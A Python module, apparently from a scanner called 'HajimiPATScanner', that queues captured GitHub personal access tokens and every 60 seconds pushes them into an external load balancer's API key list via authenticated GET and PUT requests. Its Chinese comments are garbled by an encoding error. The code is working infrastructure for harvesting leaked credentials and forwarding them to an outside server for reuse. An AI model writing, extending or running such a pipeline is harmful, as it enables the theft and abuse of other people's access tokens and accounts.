import json
import threading
import time
import traceback
from concurrent.futures import ThreadPoolExecutor
from typing import List, Dict, Optional

import requests

from common.Logger import logger
from common.config import Config
from utils.file_manager import file_manager, checkpoint


class SyncUtils:
    """åŒæ­¥å·¥å…·ç±»ï¼Œè´Ÿè´£å¼‚æ­¥å‘é€æ•èŽ·åˆ°çš„ GitHub PAT åˆ°å¤–éƒ¨åº”ç”¨"""

    def __init__(self):
        """åˆå§‹åŒ–åŒæ­¥å·¥å…· - ä¸¥è°¨å¯¹é½ Config ä¸­çš„ GROK å˜é‡å"""
        # --- é’ˆå¯¹ GitHub PAT ä¸“é¡¹ç‰ˆï¼Œæˆ‘ä»¬ä¾ç„¶æ²¿ç”¨ GROK å˜é‡åä½œä¸ºé€šé“ï¼Œä½†æ—¥å¿—æ”¹ä¸º PAT ---
        self.balancer_url = Config.GROK_BALANCER_URL.rstrip('/') if Config.GROK_BALANCER_URL else ""
        self.balancer_auth = Config.GROK_BALANCER_AUTH
        self.balancer_sync_enabled = Config.parse_bool(Config.GROK_BALANCER_SYNC_ENABLED)
        self.balancer_enabled = bool(self.balancer_url and self.balancer_auth and self.balancer_sync_enabled)

        # GPT Load Balancer é…ç½® (ç”¨äºŽåŒæ­¥åˆ° GPT æ ¼å¼çš„ç½‘å…³)
        self.gpt_load_url = Config.GPT_LOAD_URL.rstrip('/') if Config.GPT_LOAD_URL else ""
        self.gpt_load_auth = Config.GPT_LOAD_AUTH
        self.gpt_load_group_names = [name.strip() for name in Config.GPT_LOAD_GROUP_NAME.split(',') if name.strip()] if Config.GPT_LOAD_GROUP_NAME else []
        self.gpt_load_sync_enabled = Config.parse_bool(Config.GPT_LOAD_SYNC_ENABLED)
        self.gpt_load_enabled = bool(self.gpt_load_url and self.gpt_load_auth and self.gpt_load_group_names and self.gpt_load_sync_enabled)

        # å¼‚æ­¥çº¿ç¨‹æ± 
        self.executor = ThreadPoolExecutor(max_workers=2, thread_name_prefix="SyncUtils")
        self.saving_checkpoint = False

        self.batch_interval = 60
        self.batch_timer = None
        self.shutdown_flag = False

        if not self.balancer_enabled:
            logger.info("â„¹ï¸ GitHub PAT Sync to External Balancer is disabled.")
        else:
            logger.info(f"ðŸ”— GitHub PAT Sync enabled - Target: {self.balancer_url}")

        # å¯åŠ¨å‘¨æœŸæ€§å‘é€çº¿ç¨‹
        self._start_batch_sender()

    def add_keys_to_queue(self, keys: List[str]):
        """å°†æœ‰æ•ˆçš„ github_pat_ æ·»åŠ åˆ°å‘é€é˜Ÿåˆ—"""
        if not keys: return

        while self.saving_checkpoint:
            time.sleep(0.5)

        self.saving_checkpoint = True
        try:
            if self.balancer_enabled:
                checkpoint.wait_send_balancer.update(keys)
                logger.info(f"ðŸ“¥ {len(keys)} Token(s) added to external sync queue.")
            
            if self.gpt_load_enabled:
                checkpoint.wait_send_gpt_load.update(keys)
            
            file_manager.save_checkpoint(checkpoint)
        finally:
            self.saving_checkpoint = False

    def _send_balancer_worker(self, keys: List[str]) -> str:
        """æ‰§è¡Œå®žé™…çš„ PUT è¯·æ±‚ï¼Œå°† PAT æ›´æ–°åˆ°è¿œç¨‹ API_KEYS åˆ—è¡¨"""
        try:
            # ä¸¥è°¨å¯¹é½ï¼šè™½ç„¶å˜é‡åå¸¦ GROKï¼Œä½†å®žè´¨å‘é€çš„æ˜¯ PAT
            config_url = f"{self.balancer_url}/api/config"
            headers = {
                'Cookie': f'auth_token={self.balancer_auth}',
                'User-Agent': 'HajimiPATScanner/2.0'
            }

            # 1. èŽ·å–çŽ°æœ‰é…ç½®
            response = requests.get(config_url, headers=headers, timeout=20)
            if response.status_code != 200: return "err_get_config"

            config_data = response.json()
            current_api_keys = config_data.get('API_KEYS', [])
            
            # 2. åˆå¹¶åŽ»é‡
            existing_set = set(current_api_keys)
            new_keys = [k for k in keys if k not in existing_set]
            
            if not new_keys: return "ok"

            config_data['API_KEYS'] = current_api_keys + new_keys
            
            # 3. æŽ¨é€æ›´æ–°
            update_headers = headers.copy()
            update_headers['Content-Type'] = 'application/json'
            res = requests.put(config_url, headers=update_headers, json=config_data, timeout=30)
            
            if res.status_code == 200:
                # è®°å½•å‘é€æˆåŠŸçš„æ—¥å¿—
                file_manager.save_keys_send_result(new_keys, {k: "ok" for k in new_keys})
                return "ok"
            return f"err_put_{res.status_code}"

        except Exception as e:
            logger.error(f"âŒ Sync Worker Exception: {str(e)}")
            return "exception"

    def _start_batch_sender(self) -> None:
        if self.shutdown_flag: return
        self.executor.submit(self._batch_send_worker)
        self.batch_timer = threading.Timer(self.batch_interval, self._start_batch_sender)
        self.batch_timer.daemon = True
        self.batch_timer.start()

    def _batch_send_worker(self) -> None:
        """æ‰¹é‡å¤„ç†åŒæ­¥é˜Ÿåˆ—"""
        if self.saving_checkpoint: return
        self.saving_checkpoint = True
        try:
            if checkpoint.wait_send_balancer and self.balancer_enabled:
                keys = list(checkpoint.wait_send_balancer)
                if self._send_balancer_worker(keys) == 'ok':
                    checkpoint.wait_send_balancer.clear()
                    logger.info("âœ… External Balancer sync successful.")

            # æ­¤å¤„å¯æ‰©å±• GPT Load Balancer çš„åŒæ­¥é€»è¾‘
            
            file_manager.save_checkpoint(checkpoint)
        except Exception as e:
            logger.error(f"âŒ Batch Sync Error: {e}")
        finally:
            self.saving_checkpoint = False

    def shutdown(self) -> None:
        self.shutdown_flag = True
        if self.batch_timer: self.batch_timer.cancel()
        self.executor.shutdown(wait=True)

sync_utils = SyncUtils()
